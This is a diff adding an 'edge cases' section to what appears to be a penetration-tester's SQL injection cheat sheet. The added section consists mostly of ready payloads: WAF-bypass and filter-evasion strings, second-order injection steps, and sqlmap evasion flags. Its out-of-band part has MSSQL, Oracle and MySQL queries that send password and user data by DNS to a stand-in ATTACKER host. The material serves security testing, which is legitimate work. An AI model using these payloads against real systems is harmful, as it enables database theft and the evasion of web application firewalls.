@@ -143,6 +143,74 @@ sqlmap -r req.txt --os-shell                # try for RCE
 
 </div>
 
+## :material-alert-decagram: Edge cases & gotchas
+
+=== "WAF bypass"
+
+    ```sql
+    -- Inline comments split keywords
+    UN/**/ION SEL/**/ECT      SELECT → SE%0bLECT (whitespace = tab/newline/%0c)
+    -- MySQL versioned comment executes only on MySQL
+    /*!50000UNION*/ /*!SELECT*/
+    -- Case + no spaces (parentheses/commas as separators)
+    UnIoN(SeLeCt(1),2)
+    -- Encoding layers: URL-encode twice, or use CHAR()/0xHEX for strings
+    ' UNION SELECT 0x61646d696e -- -      (no quotes needed)
+    -- Scientific notation / concat to dodge signature
+    1.e(UNION)  ;  'a'/**/OR/**/1=1
+    ```
+
+    Also try **HTTP Parameter Pollution** (`id=1&id=UNION…`) and moving the payload
+    to a header/cookie the WAF doesn't inspect.
+
+=== "No quotes / no spaces"
+
+    - **Quotes filtered:** build strings with `CHAR(97,98)`, hex `0x6162`, or
+      `CONCAT`; compare numbers instead of strings.
+    - **Spaces filtered:** `/**/`, `%09`/`%0a`/`%0c`/`%0d`, or parentheses:
+      `SELECT(column)FROM(table)`.
+    - **`=` filtered:** use `LIKE`, `IN`, `BETWEEN`, or `REGEXP`.
+    - **Comment (`-- -`, `#`) filtered:** balance the query instead —
+      `' OR '1'='1` closes the trailing quote for you.
+
+=== "Second-order"
+
+    Your payload is **stored** clean (registration, profile) and only fires when a
+    *different* feature later builds a query from it (password reset, admin report).
+    Detection: plant `'` in a stored field, then exercise every feature that reads it
+    back. `sqlmap --second-order=<url-that-triggers>` automates the re-read.
+
+=== "Out-of-band exfil"
+
+    When there's no visible/timing oracle (or you want speed over blind), exfil via
+    DNS/HTTP the DB itself initiates:
+    ```sql
+    -- MSSQL
+    '; EXEC master..xp_dirtree '\\'+(SELECT TOP 1 password FROM users)+'.ATTACKER\x'; -- -
+    -- Oracle
+    ' AND (SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.ATTACKER'))=1 -- -
+    -- MySQL (Windows, secure_file_priv off)
+    ' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT ...),'.ATTACKER\\x')) -- -
+    ```
+
+!!! bug "Why your injection isn't behaving"
+    - **Stacked queries (`;`) are driver-dependent.** PHP `mysqli_query`, most
+      MySQL PDO, and many ORMs run **one** statement — your `; DROP`/`; EXEC`
+      silently no-ops. MSSQL and PostgreSQL usually allow stacking. If stacking
+      fails, pivot to UNION/blind in the *first* statement.
+    - **Numeric context needs no quote.** `id=1` → `id=1 OR 1=1`; wrapping it in `'`
+      breaks it. Check whether your value is quoted in the query first.
+    - **`--` needs a trailing space in MySQL** (`-- -` or `--%20`); `#` also comments
+      but must be URL-encoded (`%23`) or the browser eats it.
+    - **`LIMIT` + `UNION`** conflict — if the original query has `LIMIT`, your
+      appended `UNION` may be constrained; close it or use a subquery.
+    - **ORM / JSON injection** points still exist: unsafe `.raw()`,
+      `ORDER BY` (can't parameterize a column name → injectable), `IN (…)` list
+      building, and MongoDB-style `$where`/operator injection (see
+      [NoSQL Injection](nosql-injection.md)).
+    - **WAF blocks `sqlmap`'s UA/fingerprint** — add `--random-agent`, `--tamper`
+      (e.g. `space2comment,between,charencode`), and `--technique` to narrow it.
+
 ## :material-shield-check: Remediation (for the report)
 
 - Use **parameterized queries / prepared statements** — never string-concatenate input.
